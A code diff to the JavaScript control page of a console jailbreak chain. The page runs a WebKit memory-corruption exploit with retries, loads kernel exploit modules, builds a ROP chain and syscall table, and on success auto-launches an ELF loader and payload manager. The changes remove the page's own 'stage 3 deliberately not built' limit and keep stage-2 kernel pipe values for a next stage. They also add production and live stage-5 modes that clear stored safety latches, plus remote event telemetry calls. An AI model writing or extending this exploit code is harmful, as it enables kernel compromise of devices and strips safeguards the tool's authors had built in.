     const icon = document.getElementById("statusIcon");
     const failureMessage = document.getElementById("failureMessage");
     if (failureMessage) failureMessage.className = success ? "" : "on";
-    if (icon) icon.className = success ? "ok" : "bad";
+    if (icon) {
+        icon.className = success ? "ok" : "bad";
+    }
 }
 
 function verdictBanner(kind, text) {
@@ -849,7 +1159,7 @@ function row(idx, entry, status, detail, notes) {
     main.className = status === "FAIL" ? "why" : "";
     main.textContent = detail || "";
     d.appendChild(main);
-    for (const n of (notes || [])) {
+    for (const n of (LOG_DEBUG ? (notes || []) : [])) {
         const s = document.createElement("span");
         s.className = "note";
         s.textContent = "> " + n;
@@ -858,7 +1168,7 @@ function row(idx, entry, status, detail, notes) {
     return tr;
 }
 
-const CARRY_PARAMS = { payload: /^(1|dry)$/ };
+const CARRY_PARAMS = { log: /^debug$/ };
 function carryParams(href) {
     const keep = [];
     for (const k of Object.keys(CARRY_PARAMS)) {
@@ -900,6 +1210,7 @@ function unloadBeaconInner(kind) {
         + "-triplet=" + (engine && engine.TW.tripletsValid() ? 1 : 0)
         + "-chainDead=" + (chainDead ? clean(chainDead) : "no")
         + "-latch=" + (latchState || "unknown"));
+    sendRemoteEvents(true);
 }
 window.addEventListener("pagehide", () => unloadBeacon("pagehide"));
 window.addEventListener("beforeunload", () => unloadBeacon("beforeunload"));
@@ -970,7 +1281,8 @@ async function sys(num, a, b, c, d, e, f) {
         throw new Error("sys: syscall " + numText(num) + " is BANNED -- "
             + BANNED[num]);
     if (P.syscalls[num] === undefined)
-        throw new Error("sys: " + numText(num) + " has no stub in the 5.50 map");
+        throw new Error("sys: " + numText(num)
+            + " has no stub in the active firmware profile");
     syscallCount++;
     state.syscallsIssued.add(num);
     const t0 = Date.now();
@@ -1382,7 +1694,9 @@ async function runLadder() {
             + engine.S.kqueuesClosed
             + "   |   kernel writes: " + engine.kernelWrites);
         if (engine.S.masterPipeData)
-            lines.push("STAGE 2 OUTPUT (printed and discarded; stage 3's input, " + "and stage 3 is not built): master_pipe and victim_pipe are " + "in the PS6 row above and in the beacon log");
+            lines.push("STAGE 2 OUTPUT: master_pipe and victim_pipe are retained "
+                + "in this process as Stage 3 input; values are shown in the PS6 "
+                + "row and telemetry.");
     }
     if (ctx && ctx.measured.rt)
         lines.push("MEASURED chain.run(): " + ctx.measured.rt.a.toFixed(2)
@@ -1407,7 +1721,6 @@ async function runLadder() {
             + noClose.size + " named by cleanup as do-not-close, "
             + state.fdOpen.size + " still tracked): "
             + stranded.join(",") + "");
-    lines.push("not built, DELIBERATELY: stage 3 and everything after it");
     if (aborted) lines.push("run stopped at '" + aborted + "'.");
     if (FILTERED_RUN)
         lines.push("this was A filtered pass ("
@@ -1428,22 +1741,22 @@ async function runLadder() {
         clearFailureBanners();
         setCatResult(true);
         showVerdict(false, payloadSuccess
-            ? "ELF 加载器就绪 -- 正在启动 Payload Manager"
+            ? "ELF 加载器就绪 -- 正在启动 PLK Payload Manager"
             : "成功 -- 所有检查均已通过"
                 + (mustReboot
-                    ? "\n\n越狱已修改本次启动的内核状态，再次运行前请先重启。"
-                    : "\n\n清理已完成，可以安全地重复运行。"));
+                    ? "\n\nThe jailbreak changed this boot's kernel state; reboot before running it again."
+                    : "\n\nCleanup completed and the run may be repeated safely."));
     } else if (mustReboot) {
         setCatResult(false);
-        showVerdict(true, (v ? v.text : "请立即重启 -- 状态报告和"
-            + "清理步骤 (PS7) 未能运行"
-            + (chainDead ? "，因为 ROP 链在 '" + chainDead
-                + "' 处中断"
-                : "，因此无法验证任何内容，也无法确认"
-                + "状态已还原。"))
-            + "\n\n请立即重启"
+        showVerdict(true, (v ? v.text : "reboot now -- the state report and "
+            + "cleanup row (PS7) never ran"
+            + (chainDead ? ", because the ROP chain died at '" + chainDead
+                + "'"
+                : ", so nothing has been verified and this page cannot claim "
+                + "anything was put back."))
+            + "\n\nREBOOT NOW"
             + (v && v.all.length > 1
-                ? "\n\n所有原因:\n  - " + v.all.join("\n  - ") : ""));
+                ? "\n\nAll reasons:\n  - " + v.all.join("\n  - ") : ""));
     } else {
 
         const ver = (v && v.verified) || {};
@@ -1478,8 +1791,10 @@ async function runLadder() {
 
     if (!aborted && !FILTERED_RUN) storeDel(PROGRESS_KEY);
     storeSet(RUNLOG_KEY, JSON.stringify({
-        v: 1, rev: REV, ts: Date.now(),
-        trigger: cfg.trigger, burn: cfg.burn,
+        v: 1, rev: REV, fw: window.fw_str, ts: Date.now(),
+        trigger: cfg.trigger, burn: cfg.burn, payload: cfg.payload,
+        checkpoint: CHECKPOINT,
+        proof: PROOF, only: ONLY.join(","),
         stoppedAt: aborted || "", filtered: FILTERED_RUN,
         pass: passed, fail: failed, skip: skipped,
         reboot: mustReboot,
@@ -1488,13 +1803,14 @@ async function runLadder() {
         triplets: engine && engine.TW.tripletsValid()
             ? engine.TW.S.triplets.join(",") : "",
         setuidCalls: engine ? engine.S.setuidCalls : 0,
+        kernelWrites: engine ? engine.kernelWrites : 0,
         socketsLeft: engine ? engine.TW.S.n : 0,
         chainDead: chainDead, cleanupFailed: state.cleanupFailed,
         latchDetail: (finalLatch && finalLatch.detail) || ""
     }));
 
     if (payloadSuccess)
-        stage("ELF 加载器就绪 -- 正在启动 Payload Manager", "ok");
+        stage("ELF 加载器就绪 -- 正在启动 PLK", "ok");
     else if (fullSuccess)
         stage("成功 -- " + passed + " 通过 / 0 失败", "ok");
     else if (mustReboot)
@@ -1502,14 +1818,14 @@ async function runLadder() {
     else if (failed || aborted)
         stage("失败 -- " + passed + " 通过 / " + failed + " 失败", "bad");
     else
-        stage("阶段 0-2 完成，状态已还原 -- "
-            + passed + " 通过", "ok");
+        stage("selected stages complete, nothing triggered, everything put back -- "
+            + passed + " PASS", "ok");
 
     if (payloadSuccess) {
-        flushMark("ELFLDR-MENU-INPAGE",
+        flushMark("ELFLDR-READY-AUTO-PLK",
             "no-navigation-parked-racers-and-fds-remain-owned-port=9021");
-        const pldmgrOk = await autoLaunchPldmgr();
-        if (!pldmgrOk) showPayloadMenu();
+        const plkOk = await autoLaunchPLK();
+        if (!plkOk) showPayloadMenu();
     }
 }
 
@@ -1541,7 +1857,7 @@ async function bootPrimitiveAndChain() {
         await window.run_slopkit(window.fw_str);
         flushMark("PRIMITIVE-REUSED", "via-window.run_slopkit");
     } else {
-        stage("正在运行 WebKit 漏洞 -- 约 1/3 概率命中，会自动重试");
+        stage("正在运行 WebKit 漏洞 -- 大约每 3 次尝试命中 1 次，自动重试");
 
         // A killed/reloaded WebProcess can restore this history entry with the
         // previous 65k-object SerializedScriptValue graph still attached.  If
@@ -1568,7 +1884,7 @@ async function bootPrimitiveAndChain() {
                     // This is before the large graph is built, so make the
                     // checkpoint durable if the WebProcess dies during setup.
                     flushMark(tag, detail);
-                    stage("第 " + attempt + " 次尝试 -- 等待内存布局");
+                    stage("漏洞利用尝试 " + attempt + " -- 等待内存布局");
                 } else {
                     queueEvent(tag, detail);
                 }
@@ -1611,7 +1927,7 @@ async function bootPrimitiveAndChain() {
     nogcHard.p = p;
     assertInt64Identity();
 
-    stage("正在加载内核模块");
+    stage("正在加载内核利用模块");
     await loadPoopsModules();
 
     const handoff = window.jbPrepared || null;
@@ -1622,7 +1938,7 @@ async function bootPrimitiveAndChain() {
         prepared = handoff;
         flushMark("CHAIN-REUSED", "window.jbPrepared");
     } else {
-        stage("正在准备: 模块基址、系统调用表、Worker 劫持");
+        stage("准备中: 模块基址、ROP gadget/系统调用表、Worker 劫持");
         flushMark("PREP-ENTER", "");
         prepared = await prepare(p);
         flushMark("PREP-OK", "getpid-passed-inside-prepare");
@@ -1641,6 +1957,7 @@ async function main() {
         + "-burn=" + cfg.burn + "-sockets=" + cfg.sockets
         + "-attempts=" + cfg.attempts + "-from=" + (FROM || "none")
         + "-only=" + (ONLY.join(".") || "none")
+        + "-proof=" + (PROOF || "none") + "-payload=" + (cfg.payload || "none")
         + "-stalledAt=" + (STALLED_AT || "none"));
     lockNav(true);
     runInFlight = true;
@@ -1684,9 +2001,10 @@ async function main() {
             + "; will put back mask " + driver.origMaskHex + " and rtprio "
             + driver.origPrioType + "/" + driver.origPrio + "\n" + "chain watchdog " + WATCHDOG_MS + " ms per round trip; every loop " + "on this page is bounded by an iteration count AND a wall clock, " + "and every wait has a deadline.\n";
 
-        stage("正在执行越狱步骤");
+        stage("正在执行利用链 -- 逐步进行");
         try {
             await runLadder();
+            sendRemoteEvents(false);
         } finally {
             if (chainDead)
                 danger("cleanup impossible: the ROP chain died at '" + chainDead
@@ -1751,42 +2069,140 @@ function lastRunText() {
 
 (async function entry() {
 
-    screenLine("slopkit -- reading the one-shot safety latch");
+    screenLine("slopkit -- 正在读取一次性安全锁存器");
+
+    if (PRODUCTION_REQUEST_ERROR) {
+        renderNav("", false);
+        stage("Production request refused: " + PRODUCTION_REQUEST_ERROR, "bad");
+        summaryEl.textContent = "NOTHING was cleared or executed.";
+        flushMark("POOPS-PRODUCTION-REFUSED", PRODUCTION_REQUEST_ERROR);
+        sendRemoteEvents(false);
+        return;
+    }
+
+    if (STAGE5_REQUEST_ERROR) {
+        renderNav("", false);
+        stage("Stage 5 request refused: " + STAGE5_REQUEST_ERROR, "bad");
+        summaryEl.textContent = "NOTHING was cleared or executed.";
+        flushMark("POOPS-STAGE5-REFUSED", STAGE5_REQUEST_ERROR);
+        sendRemoteEvents(false);
+        return;
+    }
 
     if (CLEARLATCH) {
         renderNav("", false);
         await clearMain();
+        sendRemoteEvents(false);
         return;
     }
 
-    stage("正在检查安全锁");
+    if (PRODUCTION_RUN) {
+        const runlogCleared = consumeStored(RUNLOG_KEY);
+        const progressCleared = consumeStored(PROGRESS_KEY);
+        const latchCleared = consumeStored(LATCH_KEY);
+        if (!runlogCleared || !progressCleared || !latchCleared) {
+            stage("Production run refused: stale state could not be cleared", "bad");
+            flushMark("POOPS-PRODUCTION-REFUSED", "stale-state-clear-unverified");
+            sendRemoteEvents(false);
+            return;
+        }
+        LAST_RUN = null;
+        STALLED_AT = "";
+        latchState = "clear";
+        flushMark("PRODUCTION-FRESH-BOOT-ASSERTED", "stale-state-cleared=1");
+    }
+
+    stage("正在检查一次性安全锁存器");
     const l = await latch.read();
     flushMark("LATCH-READ", "set=" + (l.set ? 1 : 0)
         + "-detail=" + clean(l.detail || ""));
+
+    const refreshReady = canRefreshCheckpoint(LAST_RUN);
+    const stage0ProofReady = canStartStage0Proof(LAST_RUN);
+    const stage1ProofReady = canStartStage1Proof(LAST_RUN);
+    const stage2ProofReady = canStartStage2Proof(LAST_RUN);
+    const stage3ProofReady = canStartStage3Proof(LAST_RUN);
+    const stage4ProofReady = canStartStage4Proof(LAST_RUN);
+    const stage5DryProofReady = canStartStage5Proof(
+        LAST_RUN, STAGE5_DRY_PROOF, "dry");
+    const stage5LiveProofReady = canStartStage5Proof(
+        LAST_RUN, STAGE5_LIVE_PROOF, "1");
+    const stage5ProofReady = stage5DryProofReady || stage5LiveProofReady;
+    const proofRequested = !!PROOF;
+    const proofReady = stage0ProofReady || stage1ProofReady || stage2ProofReady
+        || stage3ProofReady || stage4ProofReady || stage5ProofReady;
+    if (stage5ProofReady && !l.set) {
+        stage("armed " + PROOF_TITLE
+            + " proof refused: clean checkpoint latch is missing", "bad");
+        flushMark("POOPS-STAGE5-REFUSED", "checkpoint-latch-missing");
+        sendRemoteEvents(false);
+        return;
+    }
+    if (proofRequested && !proofReady) {
+        const proofName = PROOF_TITLE;
+        stage("armed " + proofName + " proof refused: no immediately preceding clean "
+            + "negative checkpoint record", "bad");
+        flushMark("POOPS-LATCHED", proofName.toLowerCase().replace(" ", "")
+            + "-proof-refused-no-clean-negative-record");
+        sendRemoteEvents(false);
+        return;
+    }
+
+    if (proofReady) {
+        if (!consumeStored(RUNLOG_KEY)) {
+            stage("armed proof refused: the clean checkpoint could not be consumed",
+                "bad");
+            flushMark("POOPS-LATCHED", PROOF
+                + "-proof-checkpoint-consume-failed");
+            sendRemoteEvents(false);
+            return;
+        }
+        flushMark("PROOF-CONSUMED", PROOF + "-rev=" + REV);
+    }
+
+    if (l.set && (refreshReady || proofReady)) {
+        flushMark("LATCH-AUTOCLEAR", (proofReady
+            ? "verified-clean-negative-to-" + PROOF + "-proof-rev="
+            : "verified-clean-negative-checkpoint-rev=")
+            + clean((LAST_RUN && LAST_RUN.rev) || "unknown"));
+        await latch.clear();
+        if (stage5ProofReady && !consumeStored(LATCH_KEY)) {
+            stage(PROOF_TITLE + " proof refused: latch clear could not be verified",
+                "bad");
+            flushMark("POOPS-STAGE5-REFUSED", "latch-clear-unverified");
+            sendRemoteEvents(false);
+            return;
+        }
+        stage(proofReady ? "clean negative checkpoint verified; armed "
+            + PROOF_TITLE + " proof"
+            : "previous clean negative checkpoint cleared on refresh", "ok");
+        l.set = false;
+    }
 
     // ?auto=1 clears the latch instead of asking; reboot between runs
     if (l.set && AUTOCLEAR) {
         flushMark("LATCH-AUTOCLEAR", clean(l.detail || ""));
         await latch.clear();
-        stage("安全锁已由 ?auto=1 自动清除，设置者: "
-            + (l.detail || "(无详情)")
-            + "\n假定主机自上次运行后已重启。");
+        stage("latch was set and ?auto=1 cleared it, set by: "
+            + (l.detail || "(no detail)")
+            + "\nassumes the console has been rebooted since that run.");
         l.set = false;
     }
 
     if (l.set) {
         renderNav(STALLED_AT, true);
-        stage("安全锁已设置，设置者: " + (l.detail || "(无详情)")
-            + "\n\n仅在序幕阶段失败后才可安全重新运行: setuid(1) 在本次启动中不可逆，触发器需要全新的 cred");
+        stage("the one-shot latch is set, by: " + (l.detail || "(no detail)")
+            + "\n\nre-arming is only safe after a run that failed in the " + "prologue: setuid(1) is irreversible for the boot and the trigger " + "needs a fresh singly-referenced cred");
         summaryEl.textContent = lastRunText();
         flushMark("POOPS-LATCHED", clean(l.detail || ""));
+        sendRemoteEvents(false);
         return;
     }
 
     if (!ARMED) {
         document.getElementById("arm").hidden = false;
         renderNav(STALLED_AT, false);
-        stage("未激活" + (STALLED_AT ? " -- 上次运行停止于 '"
+        stage("not armed" + (STALLED_AT ? " -- and the last run stopped at '"
             + STALLED_AT + "'" : ""));
         vitals(vitalsText("if armed with ?go=1 this page will open "));
 
@@ -1808,16 +2224,18 @@ function lastRunText() {
         summaryEl.textContent = lastRunText()
             + "\n\nSAME-process re-arm checks, and their limit stated honestly: " + "this page records the first socket fd it is given and the " + "process's uid, and can therefore notice that THIS WebProcess has " + "already run";
         flushMark("POOPS-IDLE", "rev=" + REV + "-armed=0-trigger=" + cfg.trigger);
+        sendRemoteEvents(false);
         return;
     }
 
     if (STALLED_AT && !FROM && !ONLY.length) {
 
         renderNav(STALLED_AT, false);
-        stage("上次运行停止于 '" + STALLED_AT + "'，但安全锁已清除，"
-            + "请手动选择行", "bad");
+        stage("the last run stopped at '" + STALLED_AT + "' but the latch is "
+            + "clear, so pick a row explicitly", "bad");
         summaryEl.textContent = lastRunText();
         flushMark("POOPS-STALLED", STALLED_AT);
+        sendRemoteEvents(false);
         return;
     }
 
@@ -1826,6 +2244,7 @@ function lastRunText() {
         const m = (err && err.message) || String(err);
         stage("启动失败: " + m, "bad");
         flushMark("POOPS-FAILED", (err && err.name) + ":" + m.slice(0, 160));
+        sendRemoteEvents(false);
         runInFlight = false;
         lockNav(false);
     });
